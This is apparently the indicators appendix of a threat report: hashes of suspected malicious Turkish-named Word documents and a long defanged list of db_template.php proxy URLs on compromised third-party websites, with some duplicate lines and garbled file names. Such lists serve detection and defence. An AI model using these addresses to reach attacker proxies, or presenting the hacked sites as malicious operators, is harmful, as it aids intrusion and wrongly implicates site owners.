153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58  B_hash

MIT.doc

Turkey
d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025  B_hash

Gvenlik
Ynergesi.doc

Turkey
af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102  B_hash

Gvenlik
Ynergesi.doc

Turkey
5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af  B_hash

Turkey
5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af  B_hash
3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c  B_hash

Anadolu
GÃ1⁄4neydoÄŸu

Projesinde
.doc

Turkey

Turkey

Network
Indicators

List
of
Proxy
URLs
hxxp://alessandrofoglino[.]com//db_template.php B_url.unknown
hxxp://www.easy-home-sales[.]co.za//db_template.php B_url.unknown
hxxp://www.almaarefut[.]com/admin/db_template.php B_url.unknown
hxxp://chinamall[.]co.za//db_template.php B_url.unknown
hxxp://amesoulcoaching[.]com//db_template.php B_url.unknown
hxxp://www.antigonisworld[.]com/wp-includes/db_template.php B_url.unknown
hxxps://anbinni.ba/wp-admin/db_template.php B_url.unknown
hxxp://arctistrade[.]de/wp/db_template.php B_url.unknown
hxxp://aianalytics[.]ie//db_template.php B_url.unknown
hxxp://www.gilforsenate[.]com//db_template.php B_url.unknown
hxxp://mgamule[.]co.za/oldweb/db_template.php B_url.unknown
hxxp://chrisdejager-attorneys[.]co.za//db_template.php B_url.unknown
hxxp://alfredocifuentes[.]com//db_template.php B_url.unknown
hxxp://alxcorp[.]com//db_template.php B_url.unknown
hxxps://www.aircafe24[.]com//db_template.php B_url.unknown

hxxp://agencereferencement.be/wp-admin/db_template.php B_url.unknown
hxxp://americanlegacies[.]org/webthed_ftw/db_template.php B_url.unknown
hxxps://aloefly[.]net//db_template.php B_url.unknown
hxxp://www.duotonedigital[.]co.za//db_template.php B_url.unknown
hxxp://architectsinc[.]net//db_template.php B_url.unknown
hxxp://www.tanati[.]co.za//db_template.php B_url.unknown
hxxp://emware[.]co.za//db_template.php B_url.unknown
hxxp://breastfeedingbra[.]co.za//db_template.php B_url.unknown
hxxp://alhidayahfoundation[.]co[.]uk/category/db_template.php B_url.unknown
hxxp://cashforyousa[.]co.za//db_template.php B_url.unknown
hxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.php B_url.unknown
hxxp://antjetaubert[.]de//db_template.php B_url.unknown
hxxp://hesterwebber[.]co.za//db_template.php B_url.unknown
hxxp://fickstarelectrical[.]co.za//db_template.php B_url.unknown
hxxp://alex-frost[.]com/assets/db_template.php B_url.unknown
hxxps://americanbrasil[.]com.br//db_template.php B_url.unknown
hxxps://aileeshop[.]com//db_template.php B_url.unknown
hxxps://annodle[.]com//db_template.php B_url.unknown
hxxp://goldeninstitute[.]co.za/contents/db_template.php B_url.unknown
hxxp://ednpk[.]com//db_template.php B_url.unknown
hxxp://www.arabiccasinochoice[.]com//db_template.php B_url.unknown

hxxp://proeventsports[.]co.za//db_template.php B_url.unknown
hxxp://glenbridge[.]co.za//db_template.php B_url.unknown
hxxp://berped[.]co.za//db_template.php B_url.unknown
hxxp://best-digital-slr-cameras[.]com//db_template.php B_url.unknown
hxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.php B_url.unknown
hxxp://www.alpacal[.]com//db_template.php B_url.unknown
hxxps://www.alakml[.]com/wp-admin/db_template.php B_url.unknown
hxxp://ar-rihla[.]com//db_template.php B_url.unknown
hxxp://appsvoice[.]info//db_template.php B_url.unknown
hxxp://www.bashancorp[.]co.za//db_template.php B_url.unknown
hxxp://alexanderbecker[.]net/services/db_template.php B_url.unknown
hxxp://visionclinic.co.ls/visionclinic/db_template.php B_url.unknown
hxxps://www.angelesrevista[.]com//db_template.php B_url.unknown
hxxps://www.antojoentucocina[.]com//db_template.php B_url.unknown
hxxp://apollonweb[.]com//db_template.php B_url.unknown
hxxps://www.alphapixa[.]com//db_template.php B_url.unknown
hxxp://capitalradiopetition[.]co.za//db_template.php B_url.unknown
hxxp://www.generictoners[.]co.za//db_template.php B_url.unknown
hxxps://alnahdatraining[.]com//db_template.php B_url.unknown
hxxps://albousala[.]com//db_template.php B_url.unknown

hxxps://www.dopetroleum[.]com//db_template.php B_url.unknown
hxxp://bios-chip[.]co.za//db_template.php B_url.unknown
hxxp://www.crissamconsulting[.]co.za//db_template.php B_url.unknown
hxxp://capriflower[.]co.za//db_template.php B_url.unknown
hxxp://www.dingaanassociates[.]co.za//db_template.php B_url.unknown
hxxp://indiba-africa[.]co.za//db_template.php B_url.unknown
hxxp://verifiedseller[.]co.za/js/db_template.php B_url.unknown
hxxps://www.buraqlubricant[.]com//db_template.php B_url.unknown
hxxp://aqarco[.]com/wp-admin/db_template.php B_url.unknown
hxxp://allaboutblockchain[.]net//db_template.php B_url.unknown
hxxp://www.amexcars[.]info/tpl/db_template.php B_url.unknown
hxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.php B_url.unknown
hxxp://bakron[.]co.za//db_template.php B_url.unknown
hxxp://gsnconsulting[.]co.za//db_template.php B_url.unknown
hxxp://vumavaluations[.]co.za//db_template.php B_url.unknown
hxxp://heritagetravelmw[.]com//db_template.php B_url.unknown
hxxp://ampvita[.]com//db_template.php B_url.unknown
hxxp://ahero-resource-center[.]org/administrator/db_template.php B_url.unknown
hxxps://arbulario[.]com//db_template.php B_url.unknown
hxxp://havilahglo[.]co.za/wpscripts/db_template.php B_url.unknown
hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php B_url.unknown

hxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.php B_url.unknown
hxxp://delectronics[.]com[.]pk//db_template.php B_url.unknown
hxxp://antucomp[.]com//db_template.php B_url.unknown
hxxp://advocatetn[.]com/font-awesome/fonts/db_template.php B_url.unknown
hxxps://amooy[.]com/webservice/db_template.php B_url.unknown
hxxp://www.harmonyguesthouse[.]co.za//db_template.php B_url.unknown
hxxp://alanrori[.]com//db_template.php B_url.unknown
hxxp://algarvesup[.]com//db_template.php B_url.unknown
hxxp://desirablehair[.]co.za//db_template.php B_url.unknown
hxxp://comsip[.]org.mw//db_template.php B_url.unknown
hxxp://jdcorporate[.]co.za/catalog/db_template.php B_url.unknown
hxxp://andrewfinnburhoe[.]com//db_template.php B_url.unknown
hxxp://anyeva[.]com/wp-includes/db_template.php B_url.unknown
hxxp://www.agenceuhd[.]com//db_template.php B_url.unknown
hxxp://host4unix[.]net/host24new/db_template.php B_url.unknown
hxxp://www.altaica[.]ca/wordpress/db_template.php B_url.unknown
hxxp://www.allbuyer[.]co[.]uk//db_template.php B_url.unknown
hxxp://jvpsfunerals[.]co.za//db_template.php B_url.unknown
hxxp://immaculatepainters[.]co.za//db_template.php B_url.unknown
hxxp://tcpbereka[.]co.za/js/db_template.php B_url.unknown
hxxp://clientcare.co.ls//db_template.php B_url.unknown

hxxp://investaholdings[.]co.za/htc/db_template.php B_url.unknown
hxxp://www.amjobs[.]co[.]uk//db_template.php B_url.unknown
hxxp://www.agirlgonewine[.]com/store/db_template.php B_url.unknown
hxxp://findinfo-more[.]com//db_template.php B_url.unknown
hxxp://asgen[.]org//db_template.php B_url.unknown
hxxp://alphasalesrecruitment[.]com//db_template.php B_url.unknown
hxxp://irshadfoundation[.]co.za//db_template.php B_url.unknown
hxxp://analternatif[.]com/includes/db_template.php B_url.unknown
hxxp://arbruisseau[.]com/profiles/db_template.php B_url.unknown
hxxp://ladiescircle[.]co.za//db_template.php B_url.unknown
hxxp://all-reseller[.]com/zzz_backup/db_template.php B_url.unknown
hxxp://alcatrazmoon[.]com/images/db_template.php B_url.unknown
hxxp://www.alcalumni[.]com/wp-includes/db_template.php B_url.unknown
hxxp://aniljoseph[.]com/servermon/db_template.php B_url.unknown
hxxp://alwake3press[.]com/wp-includes/db_template.php B_url.unknown
hxxp://www.hfhl[.]org.ls/habitat/db_template.php B_url.unknown
hxxp://alcafricanos[.]com/slsmonographs/db_template.php B_url.unknown
hxxps://agapeencounter[.]org//db_template.php B_url.unknown
hxxp://apobiomedix[.]ca//db_template.php B_url.unknown
hxxp://anythinglah[.]info//db_template.php B_url.unknown
hxxp://aniroleplay[.]net//db_template.php B_url.unknown

hxxp://aniroleplay[.]net//db_template.php B_url.unknown
hxxp://www.allcopytoners[.]com//db_template.php B_url.unknown
hxxp://alphaobring[.]com//db_template.php B_url.unknown
hxxp://www.galwayprimary[.]co.za//db_template.php B_url.unknown
hxxp://alnuzha[.]org/en/db_template.php B_url.unknown
hxxps://ancient-wisdoms[.]com//db_template.php B_url.unknown
hxxp://amazingenergysavings[.]net//db_template.php B_url.unknown
hxxp://gvs[.]com[.]pk/font-awesome/db_template.php B_url.unknown
hxxp://geetransfers[.]co.za/font-awesome/db_template.php B_url.unknown
hxxp://carlagrobler[.]co.za/components/db_template.php B_url.unknown
hxxp://amazingashwini[.]com//db_template.php B_url.unknown
hxxp://aminearserver[.]es//db_template.php B_url.unknown
hxxp://lensofafrica[.]co.za//db_template.php B_url.unknown
hxxp://greenacrestf[.]co.za/video/db_template.php B_url.unknown
hxxp://www.tonaro[.]co.za//db_template.php B_url.unknown
hxxp://alephit2[.]biz/kitzz/db_template.php B_url.unknown
hxxp://lppaportal[.]org.ls//db_template.php B_url.unknown
hxxp://alkousy[.]com//db_template.php B_url.unknown
hxxp://ambulatorioveterinariocalusco[.]com/img/common/db_template.php B_url.unknown
hxxp://fragranceoil[.]co.za//db_template.php B_url.unknown
hxxp://www.eloquent[.]co.za/nweb2/db_template.php B_url.unknown

hxxp://chrishanicdc[.]org/wpimages/db_template.php B_url.unknown
hxxp://ahc.me[.]uk//db_template.php B_url.unknown
hxxp://www.britishasia-equip[.]co[.]uk//db_template.php B_url.unknown
hxxp://always-beauty[.]ch//db_template.php B_url.unknown
hxxps://www.ancamamara[.]com/wp-admin/db_template.php B_url.unknown
hxxp://entracorntrading[.]co.za//db_template.php B_url.unknown
hxxp://www.alexjeffersonconsulting[.]com/wp-includes/db_template.php B_url.unknown
hxxp://americabr[.]com.br//db_template.php B_url.unknown
hxxp://andrew-snyder[.]net/bootstrap/db_template.php B_url.unknown
hxxp://signsoftime[.]co.za//db_template.php B_url.unknown
hxxp://aperta-armis[.]org//db_template.php B_url.unknown
hxxp://absfinancialplanning[.]co.za/images/db_template.php B_url.unknown
hxxp://charispaarl[.]co.za//db_template.php B_url.unknown
hxxp://indlovusecurity[.]co.za//db_template.php B_url.unknown
hxxp://alcafricandatalab[.]com//db_template.php B_url.unknown
hxxp://amor-clubhotels[.]com//db_template.php B_url.unknown
hxxp://mokorotlocorporate[.]com//db_template.php B_url.unknown
hxxp://apppriori[.]com//db_template.php B_url.unknown
hxxp://luxconprojects[.]co.za//db_template.php B_url.unknown
hxxp://androidphonetips[.]com/wp-includes/db_template.php B_url.unknown

hxxp://angel-seeds[.]com.ua/catalog/db_template.php B_url.unknown
hxxp://angel-seeds[.]com.ua/catalog/db_template.php B_url.unknown
hxxp://alissanicolai[.]com/assets/db_template.php B_url.unknown
hxxps://www.amateurastronomy[.]org//db_template.php B_url.unknown
hxxp://aiofotoevideo[.]com//db_template.php B_url.unknown
hxxp://www.amika.hr//db_template.php B_url.unknown
hxxp://comfortex[.]co.za/php/db_template.php B_url.unknown
hxxp://deepgraphics[.]co.za//db_template.php B_url.unknown
hxxps://agiledepot[.]com//db_template.php B_url.unknown
hxxp://almatours[.]gr//db_template.php B_url.unknown
hxxp://analystcnwang[.]com//db_template.php B_url.unknown
hxxp://www.malboer[.]co.za/trendy1/db_template.php B_url.unknown
hxxp://sefikengfarm.co.ls//db_template.php B_url.unknown
hxxp://www.antirughenaturale[.]com/wp-admin/db_template.php B_url.unknown
hxxp://passright[.]co.za//db_template.php B_url.unknown
hxxp://seismicfactory[.]co.za//db_template.php B_url.unknown
hxxp://alessandroalessandrini[.]it//db_template.php B_url.unknown
hxxps://aquabsafe[.]com//db_template.php B_url.unknown
hxxp://amatikulutours[.]com/tmp/db_template.php B_url.unknown
hxxp://ganitis[.]gr//db_template.php B_url.unknown
hxxp://aleenasgiftbox[.]com/admin/db_template.php B_url.unknown
hxxps://allusdoctors[.]com/themes/db_template.php B_url.unknown

hxxp://alainsaffel[.]com//db_template.php B_url.unknown
hxxp://www.ariehandomri[.]com//db_template.php B_url.unknown
hxxp://aquaneeka[.]co[.]uk/wp-includes/db_template.php B_url.unknown
hxxp://itengineering[.]co.za/gatewaydiamond/db_template.php B_url.unknown
hxxp://alldomains-crm[.]com/bubblegumpopcorn[.]com/wp-admin/db_template.php B_url.unknown
hxxp://www.albertamechanical[.]ca//db_template.php B_url.unknown
hxxp://alchamel[.]info//db_template.php B_url.unknown
hxxps://almokan[.]net/wp-includes/db_template.php B_url.unknown
hxxp://jakobieducation[.]co.za//db_template.php B_url.unknown
hxxps://arc-sec[.]net//db_template.php B_url.unknown
hxxp://ldams[.]org.ls/supplies/db_template.php B_url.unknown
hxxp://menaboracks[.]co.za/tmp/db_template.php B_url.unknown
hxxp://www.getcord[.]co.za//db_template.php B_url.unknown
hxxp://boardaffairs[.]com//db_template.php B_url.unknown
hxxp://capetownway[.]co.za//db_template.php B_url.unknown
hxxp://cloudhostdesign[.]com//db_template.php B_url.unknown
hxxp://hartenboswaterpark[.]co.za/templates/db_template.php B_url.unknown
hxxp://fccorp[.]co.za/php/db_template.php B_url.unknown
hxxp://angar68[.]com//db_template.php B_url.unknown
hxxp://www.dws-gov[.]co.za//db_template.php B_url.unknown

hxxp://alwahahweb[.]com//db_template.php B_url.unknown
hxxp://alwahahweb[.]com//db_template.php B_url.unknown
hxxp://anuragcreatives[.]com//db_template.php B_url.unknown
hxxp://embali[.]co.za//db_template.php B_url.unknown
hxxp://albertaedmonton[.]com/widgetstyles/db_template.php B_url.unknown
hxxp://altosdefontana[.]com//db_template.php B_url.unknown
hxxp://airfanhydro[.]net//db_template.php B_url.unknown
hxxps://www.alexponcet[.]com/wp-includes/db_template.php B_url.unknown
hxxp://agropecuariavilarica[.]com.br//db_template.php B_url.unknown
hxxps://www.amazingbuyrd[.]com/admin/db_template.php B_url.unknown
hxxp://cdxtrading[.]co.za//db_template.php B_url.unknown
hxxp://interafricaconsulting[.]com/wpimages/db_template.php B_url.unknown
hxxp://glgroup[.]co.za/images/db_template.php B_url.unknown
hxxp://hisandherskennels[.]co.za/php/db_template.php B_url.unknown
hxxp://alemaohost[.]com/lotosorg[.]com/db_template.php B_url.unknown
hxxp://isibaniedu[.]co.za/admin/db_template.php B_url.unknown
hxxp://dianakleyn[.]co.za/layouts/db_template.php B_url.unknown
hxxp://themotoringcalendar[.]co.za//db_template.php B_url.unknown
hxxp://www.loansonhomes[.]co.za//db_template.php B_url.unknown
hxxp://edgesecurity[.]co.za/js/db_template.php B_url.unknown
hxxp://highschoolsuperstar[.]co.za/files/db_template.php B_url.unknown
hxxp://www.ambientproperty[.]com//db_template.php B_url.unknown

hxxp://animationshowreel[.]co.il//db_template.php B_url.unknown
hxxp://cafawelding[.]co.za/font-awesome/db_template.php B_url.unknown
hxxp://apalawyers.pt//db_template.php B_url.unknown
hxxp://www.edesignz[.]co.za//db_template.php B_url.unknown
hxxp://centuryacademy[.]co.za/css/db_template.php B_url.unknown
hxxps://ambyenta.hr//db_template.php B_url.unknown
hxxp://ceramica[.]co.za//db_template.php B_url.unknown
hxxp://www.alfredoposada[.]com//db_template.php B_url.unknown
hxxp://anastasovsworkshop[.]com/wp-includes/db_template.php B_url.unknown
hxxp://allisonplumbing[.]com/wp-includes/db_template.php B_url.unknown
hxxp://eastrandmotorlab[.]co.za/fleet/db_template.php B_url.unknown
hxxp://angelsongroup[.]com/wp-includes/db_template.php B_url.unknown
hxxp://www.mikimaths[.]com//db_template.php B_url.unknown
hxxp://hjb-racing[.]co.za/htdocs/db_template.php B_url.unknown
hxxp://anotherpartofme[.]com/wp-includes/db_template.php B_url.unknown
hxxp://www.andreabelfi[.]com//db_template.php B_url.unknown
hxxp://www.iancullen[.]co.za//db_template.php B_url.unknown
hxxp://alaskamaterials[.]com//db_template.php B_url.unknown
hxxp://jeanetteproperties[.]co.za//db_template.php B_url.unknown
hxxp://www.digitalmedia[.]co.za//db_template.php B_url.unknown

hxxp://www.rejoicetheatre[.]com//db_template.php B_url.unknown
hxxp://www.rejoicetheatre[.]com//db_template.php B_url.unknown
hxxps://alterwebhost[.]com//db_template.php B_url.unknown
hxxp://bc-u[.]co[.]uk//db_template.php B_url.unknown
hxxp://dpscdgkhan.edu[.]pk/shopping/db_template.php B_url.unknown
hxxp://edgeforensic[.]co.za//db_template.php B_url.unknown
hxxp://willpowerpos[.]co.za//db_template.php B_url.unknown
hxxp://antrismode[.]com/wp-includes/db_template.php B_url.unknown
hxxp://colenesphotography[.]co.za/modules/db_template.php B_url.unknown
hxxp://anthaigroup.vn//db_template.php B_url.unknown
hxxps://alphainvestors[.]com.au//db_template.php B_url.unknown
hxxps://aliart[.]nl//db_template.php B_url.unknown
hxxps://allmantravel[.]com/thumbs/db_template.php B_url.unknown
hxxp://fbrvolume[.]co.za//db_template.php B_url.unknown
hxxp://amordegato[.]es/storefront/db_template.php B_url.unknown
hxxp://agylub[.]com//db_template.php B_url.unknown
hxxp://www.khotsonglodge.co.ls//db_template.php B_url.unknown
hxxp://ampli5yd[.]com//db_template.php B_url.unknown
hxxps://animeok[.]co.il//db_template.php B_url.unknown
hxxps://arbeidsrechtcentrum[.]nl//db_template.php B_url.unknown
hxxp://erniecommunications[.]co.za/js/db_template.php B_url.unknown
hxxp://promechtransport[.]co.za/scripts/db_template.php B_url.unknown

hxxp://centuriongsd[.]co.za//db_template.php B_url.unknown
hxxp://www.agencesylvieleclerc[.]com//db_template.php B_url.unknown
hxxp://delcom[.]co.za//db_template.php B_url.unknown
hxxps://aleoestudio[.]com/gallonature/db_template.php B_url.unknown
hxxp://oftheearthphotography[.]com/www/db_template.php B_url.unknown
hxxp://h-dubepromotions[.]co.za//db_template.php B_url.unknown
hxxp://www.alessioborzuola[.]com/downloads/db_template.php B_url.unknown
hxxp://crystaltidings[.]co.za//db_template.php B_url.unknown
hxxp://funeralbusinesssolution[.]com/email_template/db_template.php B_url.unknown
hxxp://funisalodge[.]co.za/data1/db_template.php B_url.unknown
hxxp://experttutors[.]co.za//db_template.php B_url.unknown
hxxps://www[.]cartridgecave[.]co.za//db_template.php B_url.unknown
hxxp://ecs-consult[.]com//db_template.php B_url.unknown
hxxp://www.animationinisrael[.]org/tmp_images/db_template.php B_url.unknown
hxxp://gideonitesprojects[.]com//db_template.php B_url.unknown
hxxp://hybridauto[.]co.za/photography/db_template.php B_url.unknown
hxxp://africanpixels.zar.cc//db_template.php B_url.unknown
hxxp://ryanchristiefurniture[.]co.za//db_template.php B_url.unknown
hxxp://evansmokaba[.]com/evansmokaba[.]com/thabiso/db_template.php B_url.unknown
hxxp://almeriahotelja[.]com/dk/db_template.php B_url.unknown

hxxp://al3abflash[.]biz//db_template.php B_url.unknown
hxxp://al3abflash[.]biz//db_template.php B_url.unknown
hxxp://www.fun4kidz[.]co.za//db_template.php B_url.unknown
hxxp://alsharhanstore[.]com//db_template.php B_url.unknown
hxxp://www[.]infratechconsulting[.]com//db_template.php B_url.unknown
hxxp://algihad[.]com/assets/db_template.php B_url.unknown
hxxp://americanwestmedia[.]com//db_template.php B_url.unknown
hxxp://charliewestsecurity[.]co.za//db_template.php B_url.unknown
hxxp://beehiveholdingszar[.]co.za//db_template.php B_url.unknown
hxxp://analyticalfootball[.]com//db_template.php B_url.unknown
hxxp://apiiination[.]com/leadership/db_template.php B_url.unknown
hxxps://ahelicoptermom[.]com/wp-includes/db_template.php B_url.unknown
hxxp://servicebox[.]co.za//db_template.php B_url.unknown
hxxp://globalelectricalandconstruction[.]co.za/wpscripts/db_template.php B_url.unknown
hxxps://aquo[.]in//db_template.php B_url.unknown
hxxps://www.alfransia[.]com/wp-admin/db_template.php B_url.unknown
hxxp://www.icsswaziland[.]com//db_template.php B_url.unknown
hxxp://aiko.pro//db_template.php B_url.unknown
hxxps://alceharfield[.]com//db_template.php B_url.unknown
hxxp://indocraft[.]co.za/test/db_template.php B_url.unknown
hxxp://allegiancesecurity[.]org//db_template.php B_url.unknown
hxxp://sullivanprimary[.]co.za//db_template.php B_url.unknown

hxxp://www.apmequestrian[.]com//db_template.php B_url.unknown
hxxps://alphawaves[.]org/wp-admin/db_template.php B_url.unknown
hxxp://www.alexandrasternin[.]com/illustration/db_template.php B_url.unknown
hxxp://www.daleth[.]co.za//db_template.php B_url.unknown
hxxp://jwseshowe[.]co.za/assets/db_template.php B_url.unknown
hxxp://winagainstebola[.]com//db_template.php B_url.unknown
hxxp://anubandh[.]in//db_template.php B_url.unknown
hxxp://www.alexanderhomestead[.]com//db_template.php B_url.unknown
hxxp://alfatek-intelligence[.]com//db_template.php B_url.unknown
hxxp://www.aprendiendoencasa[.]com/wp-includes/db_template.php B_url.unknown
hxxp://alorabrownies[.]com/wp-admin/db_template.php B_url.unknown
hxxp://andrasadam[.]com/tothildiko/wp-includes/db_template.php B_url.unknown
hxxp://cazochem[.]co.za/cazochem/db_template.php B_url.unknown
hxxp://debnoch[.]com/image/db_template.php B_url.unknown
hxxp://hmholdings360[.]co.za//db_template.php B_url.unknown
hxxp://iinvest4u[.]co.za//db_template.php B_url.unknown
hxxp://burgercoetzeeattorneys[.]co.za//db_template.php B_url.unknown
hxxp://anngrigphoto[.]com//db_template.php B_url.unknown
hxxp://alchemistasonida[.]com//db_template.php B_url.unknown
hxxp://anahera[.]biz/admin/db_template.php B_url.unknown

hxxp://h-u-i[.]co.za/heiren/db_template.php B_url.unknown
hxxp://h-u-i[.]co.za/heiren/db_template.php B_url.unknown
hxxp://insta-art[.]co.za//db_template.php B_url.unknown
hxxp://muallematsela[.]com//db_template.php B_url.unknown
hxxp://aguasdecastilla[.]com/uploads/db_template.php B_url.unknown
hxxp://www.arabgamenetwork[.]com//db_template.php B_url.unknown
hxxps://arhiepiscopiabucurestilor[.]ro/templates/db_template.php B_url.unknown
hxxp://amruthavana[.]com/blog/db_template.php B_url.unknown
hxxp://digitalblue[.]co.za//db_template.php B_url.unknown
hxxps://www.alvarezarquitectos[.]com//db_template.php B_url.unknown
hxxp://buboobioinnovations[.]co.za/wpimages/db_template.php B_url.unknown
hxxp://andrewsbisom[.]com//db_template.php B_url.unknown
hxxp://www.m-3[.]co.za//db_template.php B_url.unknown
hxxp://beesrenovations[.]co.za/images/db_template.php B_url.unknown
hxxps://www.apliety[.]co.il/wp-includes/db_template.php B_url.unknown
hxxp://alchamelup[.]org/htdocs/db_template.php B_url.unknown
hxxp://benonicoc[.]co.za/resources/db_template.php B_url.unknown
hxxps://al-mostakbl[.]com//db_template.php B_url.unknown
hxxp://alchimiegrafiche[.]net/bbdelteatro/db_template.php B_url.unknown
hxxp://andrespazsoldan[.]com//db_template.php B_url.unknown
hxxp://in2accounting[.]co.za//db_template.php B_url.unknown
hxxp://aipa[.]ca//db_template.php B_url.unknown

hxxp://alphabee.fund/PHPMailer_5.2.0/db_template.php B_url.unknown
hxxp://arabsdeals[.]com//db_template.php B_url.unknown
hxxps://archiotronic[.]com/wp-includes/db_template.php B_url.unknown
hxxp://capewindstrading[.]co.za//db_template.php B_url.unknown
hxxps://althurayaa[.]com//db_template.php B_url.unknown
hxxp://jhphotoedits[.]co.za//db_template.php B_url.unknown
hxxp://cloudhub.co.ls/modules/db_template.php B_url.unknown
hxxp://apironco[.]com/wp-includes/db_template.php B_url.unknown
hxxp://digital-cameras-south-africa[.]co.za/script/db_template.php B_url.unknown
hxxp://ahmadhasanat[.]com//db_template.php B_url.unknown
hxxp://alexrocchi[.]com//db_template.php B_url.unknown
hxxp://aljaadi[.]com//db_template.php B_url.unknown
hxxps://www.engeltjieakademie[.]co.za//db_template.php B_url.unknown
hxxp://annabelle[.]nl/next/db_template.php B_url.unknown
hxxp://juniorad[.]co.za/vendor/db_template.php B_url.unknown
hxxp://animationpulse[.]net//db_template.php B_url.unknown
hxxp://angloglot[.]com//db_template.php B_url.unknown
hxxp://agricolavicuna.cl//db_template.php B_url.unknown
hxxp://alexelgy[.]com/allaccess/db_template.php B_url.unknown
hxxp://www.centreforgovernance[.]uk//db_template.php B_url.unknown

hxxp://www.aliandconsulting[.]com//db_template.php B_url.unknown
hxxp://balaateen[.]co.za/less/db_template.php B_url.unknown
hxxp://aleksicdunja[.]com//db_template.php B_url.unknown
hxxp://arestihome[.]com//db_template.php B_url.unknown
hxxp://am1int.fcomet[.]com/wp1/db_template.php B_url.unknown
hxxp://anet-international-group[.]com/shop/db_template.php B_url.unknown
hxxp://courtesydriving[.]co.za/js/db_template.php B_url.unknown
hxxp://annaplebanek[.]com//db_template.php B_url.unknown
hxxp://agencijazemil[.]com//db_template.php B_url.unknown
hxxp://airminumtiro[.]com//db_template.php B_url.unknown
hxxp://www.androidwikihow[.]com//db_template.php B_url.unknown
hxxp://alisabyfinna[.]com//db_template.php B_url.unknown
hxxp://rma-law[.]co.za//db_template.php B_url.unknown
hxxp://amari[.]ro/components/db_template.php B_url.unknown
hxxp://anxiousandunstoppable[.]com//db_template.php B_url.unknown
hxxp://www.buhlebayoacademy[.]com//db_template.php B_url.unknown
hxxp://arabellajo[.]com/wp/wp-includes/db_template.php B_url.unknown
hxxp://blackthorn[.]co.za//db_template.php B_url.unknown
hxxp://alaqaba[.]com/dnsarabia[.]com/db_template.php B_url.unknown
hxxp://airesis.blog/wp-admin/db_template.php B_url.unknown
hxxp://www.aptibet[.]org//db_template.php B_url.unknown

hxxp://alecattic[.]com/wp-includes/db_template.php B_url.unknown
hxxp://anglero[.]com//db_template.php B_url.unknown
hxxp://getabletravel[.]co.za/wpscripts/db_template.php B_url.unknown
hxxp://www.allwestdental[.]com/wp-includes/db_template.php B_url.unknown
hxxp://printernet[.]co.za//db_template.php B_url.unknown
hxxp://genesisbs[.]co.za//db_template.php B_url.unknown
hxxp://allsporthealthandfitness[.]com//db_template.php B_url.unknown
hxxp://www.humorcarbons[.]com//db_template.php B_url.unknown
hxxp://intelligentprotection[.]co.za//db_template.php B_url.unknown
hxxp://amazethings[.]com//db_template.php B_url.unknown
hxxp://incoso[.]co.za/images/db_template.php B_url.unknown
hxxp://www.antoanetapalikarska[.]com//db_template.php B_url.unknown
hxxps://www.alteaparadise[.]com/wp-includes/db_template.php B_url.unknown
hxxp://amirmenahem[.]com//db_template.php B_url.unknown
hxxp://isound[.]co.za//db_template.php B_url.unknown
hxxp://www.alestilorachel[.]com//db_template.php B_url.unknown
hxxp://alcfm[.]net/wp-admin/db_template.php B_url.unknown
hxxp://www.acer-parts[.]co.za//db_template.php B_url.unknown
hxxp://www.gsmmid[.]com//db_template.php B_url.unknown
hxxp://skhaleni[.]co.za//db_template.php B_url.unknown

hxxps://amiici.vision//db_template.php B_url.unknown
hxxps://andihaas[.]at/wp-includes/db_template.php B_url.unknown
hxxp://www.albertaprimebeef[.]com//db_template.php B_url.unknown
hxxps://www.appster[.]it/wp-includes/db_template.php B_url.unknown
hxxp://amofoundation[.]org/wp-includes/db_template.php B_url.unknown
hxxp://iqra[.]co.za/pub/db_template.php B_url.unknown
hxxp://thecompasssolutions[.]co.za//db_template.php B_url.unknown
hxxp://archwaycarpetscrm[.]co[.]uk//db_template.php B_url.unknown
hxxp://iggleconsulting[.]com//db_template.php B_url.unknown
hxxps://angel-blanco[.]net/wp-includes/db_template.php B_url.unknown
hxxps://anotherdayinparadise[.]ca//db_template.php B_url.unknown
hxxp://www.bitp[.]co.za//db_template.php B_url.unknown
hxxp://cupboardcure[.]co.za/vendor/db_template.php B_url.unknown
hxxp://all2wedding[.]com/wp-includes/db_template.php B_url.unknown
hxxp://allianz[.]com.pe/wp-admin/db_template.php B_url.unknown
hxxp://amiehepperlin[.]com//db_template.php B_url.unknown
hxxps://www.amighini[.]it/webservice/db_template.php B_url.unknown
hxxp://broken-arrow[.]co.za//db_template.php B_url.unknown
hxxp://www.ihlosiqs-pm[.]co.za//db_template.php B_url.unknown
hxxp://alisimple[.]si/wp-includes/db_template.php B_url.unknown
hxxp://allthat[.]social//db_template.php B_url.unknown

hxxp://allthat[.]social//db_template.php B_url.unknown
hxxp://www.amphibiblechurch[.]com//db_template.php B_url.unknown
hxxp://bestencouragementwords[.]com//db_template.php B_url.unknown
hxxp://alayhamtechnologies[.]com//db_template.php B_url.unknown
hxxps://alaskanharvestseafood[.]com/backup/db_template.php B_url.unknown
hxxps://www.air-mag[.]ro//db_template.php B_url.unknown
hxxp://get-paid-for-online-survey[.]com//db_template.php B_url.unknown
hxxp://www.antc[.]ch/wp-includes/db_template.php B_url.unknown
hxxp://firstchoiceproperties[.]co.za//db_template.php B_url.unknown
hxxp://habibtextiles[.]pk//db_template.php B_url.unknown
hxxp://fsproperties[.]co.za/engine1/db_template.php B_url.unknown
hxxp://diegemmerkat[.]co.za//db_template.php B_url.unknown
hxxp://molepetravel.co.ls//db_template.php B_url.unknown
hxxp://mmetl[.]co.za//db_template.php B_url.unknown
hxxp://altrablog[.]com//db_template.php B_url.unknown
hxxp://abrahamseed[.]co.za//db_template.php B_url.unknown
hxxp://www.amerindgen[.]com/author/admin1/db_template.php B_url.unknown
hxxp://altcoinaddict[.]com//db_template.php B_url.unknown
hxxp://iiee.edu[.]pk//db_template.php B_url.unknown
hxxp://cmhts[.]co.za/resources/db_template.php B_url.unknown
hxxp://domesticguardians[.]co.za/Banner/db_template.php B_url.unknown

hxxps://amishcountryfurnishings[.]com//db_template.php B_url.unknown
hxxps://allday[.]gr//db_template.php B_url.unknown
